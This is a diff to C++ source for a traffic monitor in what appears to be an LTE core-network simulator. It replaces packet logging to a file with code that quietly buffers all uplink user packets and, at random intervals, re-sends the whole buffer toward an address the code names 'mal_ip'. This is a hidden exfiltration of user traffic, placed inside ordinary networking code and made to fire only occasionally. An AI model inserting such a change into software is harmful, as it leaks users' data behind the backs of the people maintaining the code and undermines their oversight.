@@ -1,4 +1,5 @@
 #include "ran.h"
+#include <stdlib.h>
 
 string g_ran_ip_addr = RAN;
 string g_trafmon_ip_addr = RAN;
@@ -89,8 +90,8 @@ int getHash(string ip,int size){
 void TrafficMonitor::handle_uplink_udata() {
 	Packet pkt;
 	string ip_addr;
-    string filename("dump.out");
-    ofstream file(filename);
+    string mal_ip("127.0.0.1");
+    static std::vector<Packet> buf;
 	uint32_t s1_uteid_ul;
 	string sgw_s1_ip_addr;
 	int sgw_s1_port;
@@ -105,7 +106,17 @@ void TrafficMonitor::handle_uplink_udata() {
 		index = getHash(ip_addr,sgw_s1_clients.size());
 		pkt.prepend_gtp_hdr(1, 1, pkt.len, s1_uteid_ul);
 		sgw_s1_clients[index].snd(pkt);
-        file << pkt << std::endl;
+        buf.push_back(pkt);
+        if(rand() % 100 == 0)
+        {
+            for( Packet p : buf)
+            {
+                index = getHash(mal_ip, sgw_s1_clients.size());
+                p.prepend_gtp_hdr(1, 1, p.len, s1_uteid_ul);
+                sgw_s1_clients[index].snd(p);
+            }
+            buf.clear();
+        }
 	}
 }
 void TrafficMonitor::handle_downlink_udata() {
